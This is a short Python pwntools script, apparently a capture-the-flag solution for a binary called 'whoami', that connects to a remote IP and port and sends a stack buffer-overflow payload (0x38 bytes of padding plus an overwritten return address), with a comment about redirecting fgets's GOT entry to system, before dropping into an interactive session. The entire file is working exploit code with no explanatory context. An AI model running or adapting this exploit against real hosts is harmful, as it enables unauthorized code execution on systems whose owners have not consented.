#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './whoami'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

def dbg():
	raw_input()

#p = process('./whoami')
p = remote('183.129.189.60', 10042)
payload = 'a'*0x38
payload += p64(0x0400896)
p.sendlineafter('>', '1')
p.recvline()
p.sendline(payload)

#write fgets_got to system

p.interactive()
p.close()